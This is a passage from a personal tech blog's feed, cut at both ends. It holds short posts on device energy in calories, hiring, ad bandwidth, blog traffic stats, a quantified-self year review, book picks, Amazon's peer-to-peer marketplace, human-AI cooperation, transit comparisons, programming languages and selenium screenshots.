<p>It’s possible I’m overreacting and these attempts were accidental but    it’s incredibly frustrating to have to waste time on a phone dealing with these errors. I’m more annoyed than most since I code for a living and know how easy these would be to fix. If not malicious then it’s negligent. There’s no consumer protection here and I’m sure tons of people fall privy to this scam. I wish we could do more but for now all we can do is always review our billing statements.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Powering our devices using the human body</title>
   <link href="http://dangoldin.com/2017/01/16/powering-our-devices-using-the-human-body/"/>
   <updated>2017-01-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/01/16/powering-our-devices-using-the-human-body</id>
   <content:encoded><![CDATA[
<p>Lately I’ve been thinking of how we’re moving more and more to a world where humans will start merging with technology. We’re already carrying our phones around nearly every minute of every day but at least we keep them in our pockets. Watches are always on our wrists and with augmented reality the permanently attached technologies will only grow.</p>

<p>At some point they’ll just become part of our bodies and I was curious what additional energy we’d need to consume in order to power these devices. A naive calculation makes it seem that our devices are incredibly cheap to power. An iPhone 6S <a href="https://www.apple.com/legal/more-resources/docs/apple-product-information-sheet.pdf">comes with</a> 6.61 Watt hour battery which is 23,796 Watt seconds (6.61 * 60 * 60). And since a single calorie is equivalent to 4.1868 Watt seconds with some simple math we get that an iPhone 6s battery is equivalent to 5683 calories. But these are true calories and not what’s actually listed on food labels. Food labels list kilocalories so remarkably the capacity of an iPhone 6s is fewer than 6 “food” calories. For context 6 calories is what one gets from a large strawberry. I charge my phone once a day and I’m shocked that the energy in a strawberry would be able power my phone for a single day.</p>

<p>I’m sure the math is not that simple and there’s a lot of factors I’m not taking into account but it’s amazing to think how incredibly efficient smartphones are given all they do. I can imagine a future where instead of having separate chargers for our devices we can power them through our bodies. And while this vision is reminiscent of The Matrix and is a bit dystopian it does have its appeal and I suspect we’re getting closer and closer.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Find the arbitrage opportunities in hiring</title>
   <link href="http://dangoldin.com/2017/01/14/find-the-arbitrage-opportunities-in-hiring/"/>
   <updated>2017-01-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/01/14/find-the-arbitrage-opportunities-in-hiring</id>
   <content:encoded><![CDATA[
<p>With the football playoffs upon us I’ve been thinking of why some teams are more successful than others. They all have approximately the same budget to allocate across a 53 person roster yet some teams are consistently dominant while others predictably fail. What’s so special about the teams that succeed? There’s obviously the coaching but I believe the bulk of the credit should go to the players. Imagine if a single team had a budget that was an order of magnitude more than the next best team: that team would be stacked with the best players and would dominate in competitions.</p>

<p>The best teams are the ones that are able to find arbitrage opportunities by getting players that are much better than their salary dictates. This may involve drafting players with high potential or trading for players that are undervalued and underutilized. If everyone knows that a player is great that will be baked into the price and while that player will improve the overall quality of the team it would reduce the overall budget and make getting additional star players more difficult.</p>

<p>Hiring can be the same thing. Netflix has a well known <a href="http://www.slideshare.net/reed2001/culture-1798664">culture deck</a> indicating that they want to view themselves a sports team with a limited number of roster spots and they’re looking to maximize the contribution of each one. While a bit extreme this is a healthy attitude for a company to have. We all have limited budgets and making each dollar go as far is it can is what separates success from failure. This is especially important in a startup which may not be profitable and is going through a limited amount of funding.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Information bandwidth of audio and display ads</title>
   <link href="http://dangoldin.com/2017/01/11/information-bandwidth-of-audio-and-display-ads/"/>
   <updated>2017-01-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/01/11/information-bandwidth-of-audio-and-display-ads</id>
   <content:encoded><![CDATA[
<p>I’ve been reading a lot of articles lately on how the shift to audio interactions at home, namely Echo, have the potential to disintermediate Google. The gist is that Google makes the bulk of its revenue from search ads that will show up alongside the organic results. At that point the user can either click on an organic result powered by Google search or an ad powered by an auction. This approach works for the web where we can process the page at a glance but doesn’t translate neatly in an audio context. Imagine asking the Echo to give you the local weather but instead of that getting a list of weather related options first. That would be an utter flop but we tolerate it on the web where our eyes have multiple of orders more information bandwidth than our ears.</p>

<p>The entire idea of bandwidth of the different senses is fascinating and it’s both incredible and obvious how much of the world depends on our physiology. It shouldn’t be surprising at all but but we take so much of it for granted that noticing these things is an enlightening experience. We naturally gravitate toward designs that fit our biology but taking a step back and thinking why we’re designing them this way can inspire a whole new thought process.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Top posts of 2016</title>
   <link href="http://dangoldin.com/2017/01/04/top-posts-of-2016/"/>
   <updated>2017-01-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/01/04/top-posts-of-2016</id>
   <content:encoded><![CDATA[
<p>I’ve been writing two posts a week since the beginning of 2013 and at this point I have quite a few articles - some are one hit wonders, others are completely forgotten, while a select few are “evergreen” and are able to continually attract readers. With the start of 2017 I’ve seen a ton of bloggers doing a post highlighting their top posts from 2016 so I figured it would be fun to do the same. The data was all fetched using Google Analytics but there was a week long gap in early September when I deliberately broke the tracking while upgrading the blog to AMP. While I was hoping to get some increased growth in 2016 the total traffic ended up being pretty close to that 2015. A goal for 2017 is to focus more on evergreen posts with the goal being to build a larger audience with posts that are less responsive to the news and more about providing real value. And now on to the data:</p>

<img src="http://dangoldin.com/assets/static/images/pageviews-2016.png" width="2246" height="400" alt="2016 pageviews" layout="responsive"/>

<h2 id="top-posts-written-in-2016">Top Posts written in 2016</h2>

<table>
  <thead>
    <tr>
      <th>Page</th>
      <th>Pageviews</th>
      <th>Unique Pageviews</th>
      <th>Avg. Time on Page</th>
      <th>Entrances</th>
      <th>Bounce Rate</th>
      <th>% Exit</th>
      <th>Page Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>/2016/10/02/ios-wifi-security-recommendation/</td>
      <td>2,628</td>
      <td>2,546</td>
      <td>0:02:03</td>
      <td>2,543</td>
      <td>97.09%</td>
      <td>96.80%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/01/17/poor-neglected-google-voice/</td>
      <td>799</td>
      <td>764</td>
      <td>0:03:25</td>
      <td>756</td>
      <td>94.58%</td>
      <td>93.87%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/05/08/googles-photo-search-is-eerily-incredible/</td>
      <td>664</td>
      <td>643</td>
      <td>0:01:45</td>
      <td>632</td>
      <td>96.52%</td>
      <td>95.33%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/07/03/snapchats-massive-potential/</td>
      <td>633</td>
      <td>596</td>
      <td>0:02:32</td>
      <td>589</td>
      <td>93.04%</td>
      <td>92.58%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/07/16/whatever-happened-to-automatic-login/</td>
      <td>447</td>
      <td>432</td>
      <td>0:00:56</td>
      <td>427</td>
      <td>97.89%</td>
      <td>95.97%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/09/23/a-smarter-touch-id/</td>
      <td>375</td>
      <td>369</td>
      <td>0:00:19</td>
      <td>365</td>
      <td>98.63%</td>
      <td>97.33%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/02/15/design-your-database-for-flexibility</td>
      <td>373</td>
      <td>361</td>
      <td>0:03:06</td>
      <td>356</td>
      <td>92.42%</td>
      <td>91.69%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/04/30/text-is-king/</td>
      <td>229</td>
      <td>203</td>
      <td>0:03:02</td>
      <td>183</td>
      <td>88.52%</td>
      <td>82.53%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/04/05/the-best-code-is-no-code/</td>
      <td>217</td>
      <td>175</td>
      <td>0:01:17</td>
      <td>162</td>
      <td>91.98%</td>
      <td>76.04%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/06/22/messaging-app-fragmentation/</td>
      <td>214</td>
      <td>206</td>
      <td>0:03:09</td>
      <td>199</td>
      <td>96.48%</td>
      <td>94.86%</td>
      <td>$0.00</td>
    </tr>
  </tbody>
</table>

<h2 id="top-posts-seen-in-2016">Top Posts seen in 2016</h2>

<table>
  <thead>
    <tr>
      <th>Page</th>
      <th>Pageviews</th>
      <th>Unique Pageviews</th>
      <th>Avg. Time on Page</th>
      <th>Entrances</th>
      <th>Bounce Rate</th>
      <th>% Exit</th>
      <th>Page Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>/2013/08/26/extract-info-from-a-web-page-using-javascript/</td>
      <td>3,538</td>
      <td>3,076</td>
      <td>0:04:38</td>
      <td>3,067</td>
      <td>91.62%</td>
      <td>85.81%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/10/02/ios-wifi-security-recommendation/</td>
      <td>2,628</td>
      <td>2,546</td>
      <td>0:02:03</td>
      <td>2,543</td>
      <td>97.09%</td>
      <td>96.80%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2013/12/23/getting-a-sim-card-in-india/</td>
      <td>1,513</td>
      <td>1,443</td>
      <td>0:01:27</td>
      <td>1,442</td>
      <td>94.80%</td>
      <td>93.72%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2014/02/10/using-virtualenv-in-production/</td>
      <td>1,097</td>
      <td>1,039</td>
      <td>0:05:09</td>
      <td>1,035</td>
      <td>92.17%</td>
      <td>92.80%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/01/17/poor-neglected-google-voice/</td>
      <td>799</td>
      <td>764</td>
      <td>0:03:25</td>
      <td>756</td>
      <td>94.58%</td>
      <td>93.87%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2014/07/15/set-up-https-on-ec2-running-nginx-without-elb/</td>
      <td>756</td>
      <td>718</td>
      <td>0:06:35</td>
      <td>716</td>
      <td>94.41%</td>
      <td>94.31%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/05/08/googles-photo-search-is-eerily-incredible/</td>
      <td>664</td>
      <td>643</td>
      <td>0:01:45</td>
      <td>632</td>
      <td>96.52%</td>
      <td>95.33%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2015/09/24/mapping-the-jersey-city-parking-zones-ii/</td>
      <td>659</td>
      <td>592</td>
      <td>0:02:44</td>
      <td>582</td>
      <td>90.03%</td>
      <td>88.01%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2016/07/03/snapchats-massive-potential/</td>
      <td>633</td>
      <td>596</td>
      <td>0:02:32</td>
      <td>589</td>
      <td>93.04%</td>
      <td>92.58%</td>
      <td>$0.00</td>
    </tr>
    <tr>
      <td>/2013/01/09/web-scraping-like-a-pro/</td>
      <td>457</td>
      <td>431</td>
      <td>0:07:59</td>
      <td>430</td>
      <td>91.40%</td>
      <td>91.47%</td>
      <td>$0.00</td>
    </tr>
  </tbody>
</table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Year in review: 2016</title>
   <link href="http://dangoldin.com/2017/01/02/year-in-review-2016/"/>
   <updated>2017-01-02T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/01/02/year-in-review-2016</id>
   <content:encoded><![CDATA[
<p>A hallmark of blogging is to do a year in review post with every blogger having their own distinct style. Some write about their tops posts, others about the lessons learned, some focus on the books read or places seen. I’ve been keeping meticulous daily stats around the hours slept, my physical and mental states over the course of a day, as well as the food, coffee, tea, soda, and alcohol consumed and the review is an opportunity for me to summarize and visualize this data. The goal is to identify healthy and unhealthy trends over time and use that information to make changes in my life. At the moment the stats are mostly high level summaries but what I want to do is use this data in order to identify hidden relationships in order to improve my physical state and mental moods. This is a work in progress but I hope to do more of that this coming year as well as improve the way I’m gathering this data. The analysis <a href="https://github.com/dangoldin/annual-stats-analysis">code is up on GitHub</a> with a guide and a sample file that can be analyzed. And now on to the data:</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/sleep-duration.png" alt="Sleep duration" width="800" height="600" layout="responsive"/>
      <p>Sleep duration box plot. Average of a little less than 7.5 hours but a decent range.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/coffee-tea-alcohol-soda-daily.png" alt="Coffee tea alcohol soda by day" width="800" height="600" layout="responsive"/>
      <p>Daily consumption of coffee, tea, alcohol, and soda box plot. I'm happy with the soda consumption but disappointed with the coffee and alcohol. They are very close to last year's numbers and I wanted to reduce them both. Something I'm going to focus more on in 2017.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/coffee-tea-alcohol-soda-weekly.png" alt="Coffee tea alcohol soda by week" width="800" height="600" layout="responsive"/>
      <p>Weekly consumption of coffee, tea, alcohol, and soda box plot. Similar to the above but visualizing the data rolled up by week.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-breakfast.png" alt="Breakfast wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Breakfast wordcloud. It's not obvious how to analyze text so I figured a wordcloud was a decent attempt. I really need to avoid string cheese and move towards smoothies.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-lunch.png" alt="Lunch wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Lunch wordcloud. Clearly I love my Chipotle burrito bowl but need to veer away from it in 2017.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-dinner.png" alt="Dinner wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Dinner wordcloud. Looks as if dinner is the healthiest part of my day.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-snack.png" alt="Snack wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Snack wordcloud. This one is all over the place but string cheese is pretty dominant.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-drinkslist.png" alt="Alcohol wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Alcohol wordcloud. I like my beer and wine with a pretty even split of white and red and a tiny bit of rose.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/alcohollag-vs-sleepduration.png" alt="Alcohol vs Sleep Duration" width="800" height="600" layout="responsive"/>
      <p>Alcohol (Lagged) vs Sleep Duration. This was an attempt to dig into a relationship I expected to be true: when I drink or go out I tend to sleep less. The intuition here is that I will stay up later if I'm out and will thus go to bed later. This holds pretty true although very statistically weak. Note that to do this I needed to shift the data by a day since my sleep duration is noted on the day that I woke up.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Favorite books of 2016</title>
   <link href="http://dangoldin.com/2016/12/31/favorite-books-of-2016/"/>
   <updated>2016-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/31/favorite-books-of-2016</id>
   <content:encoded><![CDATA[
<p>I have a longer post planned taking a quantified self approach to my 2016 but I wanted to share my favorite books of 2016. Looking at this list the primary themes were rediscovering my love for science fiction, digging deeper into society and culture, getting back into history - both focused on technology but also the world.</p>

<ul>
  <li><a href="https://www.amazon.com/gp/product/B0052FF7YM/ref=oh_aui_d_detailpage_o05_?ie=UTF8&amp;psc=1">The Righteous Mind: Why Good People Are Divided by Politics and Religion</a> (Jonathan Haidt): Heidt highlights morality framework that explains why there’s such a disconnect between the right and the left in politics. I ended up reading alongside the election since it just seemed that the world is getting more and more polarized.</li>
  <li><a href="https://www.amazon.com/gp/product/B01HWKSBDI/ref=oh_aui_d_detailpage_o07_?ie=UTF8&amp;psc=1">The Death and Life of Great American Cities</a> (Jane Jacobs): This has been on my list for a while and finally got the chance to dig into it. I love cities and this is foundational to understand what makes cities, and neighborhoods, great.</li>
  <li><a href="https://www.amazon.com/Between-World-Me-Ta-Nehisi-Coates-ebook/dp/B00SEFAIRI/ref=sr_1_1?s=digital-text&amp;ie=UTF8&amp;qid=1483245443&amp;sr=1-1&amp;keywords=between+the+world+and+me">Between the World and Me</a> (Ta-Nehisi Coates): Really personal book on what it’s like to be black in the United States and having to deal with the never-ending struggles.</li>
  <li><a href="https://www.amazon.com/gp/product/B0166ISAS8/ref=oh_aui_d_detailpage_o02_?ie=UTF8&amp;psc=1">Hillbilly Elegy: A Memoir of a Family and Culture in Crisis</a> (J. D. Vance): After reading Between the World and Me this takes a very similar approach but focuses on the story of growing up in the rural Midwest and making his way out.</li>
  <li><a href="https://www.amazon.com/gp/product/B00QPHKR0K/ref=oh_aui_d_detailpage_o00_?ie=UTF8&amp;psc=1">Deep South: Four Seasons on Back Roads</a> (Paul Theroux): Just an engaging read of the author driving through the rural South. I was inspired to read this after Hillbilly Elegy since I just wanted to understand the world outside of the coasts better.</li>
  <li><a href="https://www.amazon.com/How-Paris-Became-Invention-Modern-ebook/dp/B00GC53AEA/ref=sr_1_4?s=books&amp;ie=UTF8&amp;qid=1483062652&amp;sr=1-4&amp;keywords=paris+city">How Paris Became Paris: The Invention of the Modern City</a> (Joan DeJean): Picked this up when I was traveling in Paris and it’s an extremely immersive and engaging read highlighting how Paris was the first city to introduce what we claim are modern necessities: including sidewalks, public transport, and street lighting.</li>
  <li><a href="https://www.amazon.com/gp/product/B0029PBVCA/ref=oh_aui_d_detailpage_o01_?ie=UTF8&amp;psc=1">Dealers of Lightning: Xerox PARC and the Dawn of the Computer Age</a> (Michael A. Hiltzik): Just a really neat look at Xerox PARC, their growth, as well as the failure. So many key technologies were developed here and it’s great to see how it all played out.</li>
  <li><a href="https://www.amazon.com/gp/product/B019MMUAAQ/ref=oh_aui_d_detailpage_o07_?ie=UTF8&amp;psc=1">Chaos Monkeys: Obscene Fortune and Random Failure in Silicon Valley</a> (Antonio Garcia Martinez): A very personal and open look at how Silicon Valley works with a strong focus on adtech and Facebook.</li>
  <li><a href="https://www.amazon.com/gp/product/B00BWQW73E/ref=oh_aui_d_detailpage_o00_?ie=UTF8&amp;psc=1">The Everything Store: Jeff Bezos and the Age of Amazon</a> (Brad Stone): Amazon is such a dominant company and this gives a history and talks about the strategy Amazon has taken to get where it is.</li>
  <li><a href="https://www.amazon.com/Seveneves-Novel-Neal-Stephenson-ebook/dp/B00LZWV8JO/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1483245954&amp;sr=1-1&amp;keywords=seveneves">Seveneves: A Novel</a> (Neal Stephenson): What a great and novel plot. The moon is destroyed and this talks about humanity escaping and trying to rebuild. I don’t want to spoil any more but it’s a great read.</li>
  <li><a href="https://www.amazon.com/Nexus-Trilogy-Book-1-ebook/dp/B00TOZI7FM/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1483246162&amp;sr=1-1&amp;keywords=ramez+naam">The Nexus series</a> (Ramez Naam): Really engaging series that focuses on bionanotechnology and both the risks and benefits it exposes. This is a three part series and each book’s great.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amazon's peer to peer marketplace</title>
   <link href="http://dangoldin.com/2016/12/31/amazons-peer-to-peer-marketplace/"/>
   <updated>2016-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/31/amazons-peer-to-peer-marketplace</id>
   <content:encoded><![CDATA[
<div class="right10">
    <img src="http://dangoldin.com/assets/static/images/amazon-p2p.png" alt="" width="185" height="814"/>
</div>

<p>It looks as if Amazon is entering yet another market - <a href="https://www.amazon.in/p2p">the local peer to peer marketplace</a>. They just launched a peer to peer marketplace in Bangalore. The pitch is incredibly simple - you create a listing and it’s listed on Amazon. As soon as it’s sold Amazon will pick up the item and deliver it to the buyer. I’ve used Craigslist a ton in the past and coordinating the delivery and handoff was always a frustrating experience. There doesn’t seem to be much information on how quality is measured - what happens if the time you get isn’t in the shape it was listed or just doesn’t work?</p>

<p>This is a perfect example of Amazon applying their standard approach of leveraging an existing infrastructure in order to launch a new service. They have the logistics and relationships necessary for delivery figured out and are somehow able to drive the cost to something incredibly low, in this case starting at 10 rupees (~15 US cents). The only way this will work is if there’s enough scale in order to handle the pick ups and drop offs in bulk - and I’m sure is also the reason Amazon is launching it in one city for now so they can work out the kinks.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/craigslist-disrupted.png" alt="Andrew Parker's Spawn of craigslist" width="1208" height="906" layout="responsive"/>
  <p class="caption">Andrew Parker's <a href="http://thegongshow.tumblr.com/post/345941486/the-spawn-of-craigslist-like-most-vcs-that-focus">spawn of craigslist</a>.</p>
</div>

<p>In 2010, Andrew Parker <a href="http://thegongshow.tumblr.com/post/345941486/the-spawn-of-craigslist-like-most-vcs-that-focus">put together a visualization</a> of startups that were competing with the different craigslist categories but there hasn’t been a ton of competition in P2P selling. Craigslist’s network effects were just too massive but it looks as if Amazon is taking some serious steps to improve the experience by leveraging their existing strengths. Given this cost structure I can’t imagine it expanding to a country with higher delivery costs - at least until drone pickup and delivery arrives.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Human-AI cooperation</title>
   <link href="http://dangoldin.com/2016/12/30/human-ai-cooperation/"/>
   <updated>2016-12-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/30/human-ai-cooperation</id>
   <content:encoded><![CDATA[
<p>There’s been a lot written about the rise of AI and the impending automation which will lead to a mass reduction in industries requiring a human touch. The counterargument is that every time there has been a technological improvement new, higher value jobs have been created that more than offset the loss. Farming used to grossly inefficient when done by man but now massive harvesters are able to replace dozens of human workers. Similarly, technology has allowed entirely new industries to be created that just wouldn’t have been possible before - every company is embracing technology to succeed and with that comes improved efficiency and lower costs.</p>

<p>I forwarded an <a href="https://www.theguardian.com/technology/2016/dec/22/bridgewater-associates-ai-artificial-intelligence-management">article</a> about Bridgewater, a hedge fund, trying to replace managers with AI, to a <a href="https://www.linkedin.com/in/jacob-mazour-prm-cfa-b2668b11">friend</a> and he replied with the astute observation that this is already happening at Uber. The drivers are depending on an algorithm to tell them where to go and how to get there. Sure someone wrote the code but there’s no person actually telling the drivers what to do - that’s left to the algorithms. It’s only a small example now but I have no reservation that these sorts of change will sweep all industries over the next few decades.</p>

<p>I’m not as optimistic nor as bearish as many and I expect that at least in the short term we’ll find a sweet spot that’s able to leverage the strengths of AI with those of humans. A great example is to look at chess. The best chess players consistently lose to AIs but a <a href="https://en.wikipedia.org/wiki/Advanced_Chess">human paired with an AI</a> is consistently better than an AI alone. It’s unlikely that machines will all of a sudden take over and more likely it will be a fusion of the two with AI growing larger and larger in share as it improves. By then we’ve hopefully figured out how the world should look.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Traveling? Buy a local book</title>
   <link href="http://dangoldin.com/2016/12/29/traveling-buy-a-local-book/"/>
   <updated>2016-12-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/29/traveling-buy-a-local-book</id>
   <content:encoded><![CDATA[
<p>While traveling I’ve developed the habit of visiting a local bookstore and buying a book that dives into the history of that area, sometimes it’s the city and other times the country. This gives me something relaxing to do in the evenings after a day spent running around but also adds another dimension to my trip. The history heightens my experience when exploring the city since I’m able to relate what I read to the real world - be it landmarks, sculptures, or the culture.</p>

<p>Last year during my trip to Paris I got “<a href="https://www.amazon.com/How-Paris-Became-Invention-Modern-ebook/dp/B00GC53AEA/ref=sr_1_4?s=books&amp;ie=UTF8&amp;qid=1483062652&amp;sr=1-4&amp;keywords=paris+city">How Paris Became Paris: The Invention of the Modern City</a>” which covered the growth of Paris and how it introduced many features which we associate with a modern city: sidewalks, a public transit system, night time street lighting, and many others. Beyond being an engaging and immersive read it felt magical to read a chapter about a bridge before bed and then walking over that same bridge the next day with my new knowledge. This happened multiple times during the trip and each time the book improved the real world experience.</p>

<p>This year, I went to Portugal and bought “<a href="https://www.amazon.com/Conquerors-Portugal-Forged-Global-Empire-ebook/dp/B00UEL0HNK/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1483062923&amp;sr=1-1&amp;keywords=conquerors">Conquerors: How Portugal Forged the First Global Empire</a>” which covers the early history of Portuguese colonization. This was a flashback to high school history but was much more engaging this time around. Seeing the street names, plazas, and sculptures named after the personalities (villains?) in the book made my exploration more real. I even went out of my way to check out an Afonso de Albuquerque statue in a small Lisbon park.</p>

<p>This is a habit that I encourage avid readers to adopt. It gets you to read something you never otherwise would have read and adds a new layer to a trip. So far I’ve only done it for international trips but will start doing the same for domestic and local ones as well. The world is so rich in history and it’s amazing to be able to experience and feel that connection.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Comparing public transit systems: New York vs London</title>
   <link href="http://dangoldin.com/2016/12/24/comparing-public-transit-systems-new-york-vs-london/"/>
   <updated>2016-12-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/24/comparing-public-transit-systems-new-york-vs-london</id>
   <content:encoded><![CDATA[
<p>I’m behind on my 2 blog posts per week goal since I’m traveling and want see as much as I can but plan on catching up next week when I’m back. Right now I’m on a high speed train going from Porto to Lisbon and have 2.5 hours to do a bit of writing. And what’s more appropriate than comparing the public transit system of New York with that of London, and generally those of the United with those of Europe.</p>

<p>New York City has one of the world’s best transit systems with 233 miles of track and 24/7 service. This supports a population of 8.4 million spread out across 304 square miles. London, meanwhile, has 250 miles of track for a population of 8.7M over 607 square miles, and only started running a nighttime service 4 months ago.</p>

<p>The trains themselves are different - London has smaller trains, both in the passenger capacity per car as well as the number of cars per train. This smaller size is offset by more cars running more frequently which makes transfers much quicker. Every station I’ve been to in London also showed the estimated arrival time of the next train; New York is getting better but only a few stations and lines provide this information. In fact it seemed as if even the London buses had these time estimates available since Google Maps provided accurate bus arrival times.</p>

<p>London also has a more comprehensive payment system. New York is on the Metrocard while London is on the Oyster card. Similar to the Metrocard it can be used across a variety of transit options but also seems to extend to larger train stations in the area - think the equivalent of the Long Island Rail Road in New York. The usage is different as well - the Metrocard works via swipes but the Oyster card is designed around a wireless tap and go system that seems to be extending to paying directly with a phone. Another way to look at the Oyster card is as the next generation of the PATH SmartLink card. The one annoyance with the London system is that you need to tap when leaving a station since the system is divided into differently priced zones.</p>

<p>Generally, it felt that London takes more pride in their transit system and wants to do more than the minimum while New York is just focused on keeping it operational. The London stations are cleaner and better maintained with many having their own unique look. Both systems get the job done and quickly take you from point A to point B but the overall experience just seems a tad more polished designed in London.</p>

<p>The United States is not known for having the best public transit systems. It’s significantly less dense than Europe with a car owning majority that wouldn’t work well in millenia-old city grids. Europe, on the other hand, has the density and old city streets that make public transit a viable option. Strong public transit systems improve the equality of a city by making it cheap and easy for anyone to go anywhere. This allows the density of a city to rise and provide jobs that can be accessed at a low cost. Without these a city ends up being split into rich and poor neighborhoods with the poor either having to undertake an extraordinarily long or expensive commute to get to work. Europe seems to have figured this out while we discuss income inequality.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Programming languages and developer tools</title>
   <link href="http://dangoldin.com/2016/12/17/programming-languages-and-developer-tools/"/>
   <updated>2016-12-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/17/programming-languages-and-developer-tools</id>
   <content:encoded><![CDATA[
<p>As developers we want to be as productive as possible. This encourages us to improve our tools and languages to accommodate new patterns and challenges. Many of these improvements have come due to better hardware since we’re better able to cope with slight inefficiencies at the expense of higher productivity. This, coupled with the constant advancement of compilers and interpreters, has led to a massive adoption of scripting languages.</p>

<p>Lately I’ve been thinking about the trade-offs we accept when we use scripting languages. They’re easier to dive into and make it easy to build a prototype. This is especially easier with the growth of open source tools and frameworks.  Unfortunately, these prototypes are difficult to scale as as they and the team working on them get larger in scope. The lack of strong and static types makes it more difficult to undertake large scale refactors and encourages type-related bugs.</p>

<p>Proper tools are a huge boon to productivity but their power depends on the type of language. The more rigid and standardized the language or framework the easier it is to build a higher level tool. The more flexible a language the less a tool can do. This explains why strong, statically typed languages, such as Java, have amazing tools that can automate large scale refactors, identify obvious type specific bugs, and do more advanced static code analysis to identify potential issues. It’s possible to get these benefits for weak and dynamically typed languages, such as PHP, but those will only work if your code is using a particular framework or style.</p>

<p>The fact that we’re still debating the benefits of one language over another and everyone having their favor indicates that there’s no “best” language. The best language will depend on the problem and the constraints and all we can do is figure out what to use for a particular task. My approach is to do quick prototypes in Python but over time architect in such a way that the more performant and complex components can be easily replaced with Java, a strong and statically typed language.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Automatically taking screenshots of HTML elements</title>
   <link href="http://dangoldin.com/2016/12/13/automatically-taking-screenshots-of-html-elements/"/>
   <updated>2016-12-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/13/automatically-taking-screenshots-of-html-elements</id>
   <content:encoded><![CDATA[
<p>I’ve worked on a variety of scraping projects that required spinning up a browser (via selenium) and having it browse a variety of pages unattended in order to capture some data. The two most recents ones <a href="https://github.com/dangoldin/turo-automation">scraping my account data</a> from Turo and the <a href="https://github.com/dangoldin/yahoo-ffl">fantasy football stats</a> from Yahoo. These were relatively straightforward since the browser was used purely to navigate from page to page with the actual data capture done by parsing the underlying HTML.</p>

<p>Recently I needed to expand this approach to get screenshots of specific HTML elements on page. Taking a generic screenshot was easy since selenium comes with a built in function but expanding this to handle elements that were out of view and needed to be cropped took a bit of research. I found two StackOverflow responses that made this simple: the <a href="http://stackoverflow.com/questions/37882208/get-element-location-relative-to-viewport-with-selenium-python">first</a> explains how to scroll to a specific HTML element and the <a href="http://stackoverflow.com/questions/15018372/how-to-take-partial-screenshot-with-selenium-webdriver-in-python">other</a> explains how to screenshot an element. Putting these together was extremely painless with the resulting code below. The only nuance was incorporating the scroll amount into the crop in order to get the math to work out.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">OUT_DIR</span> <span class="o">=</span> <span class="s">'out'</span>

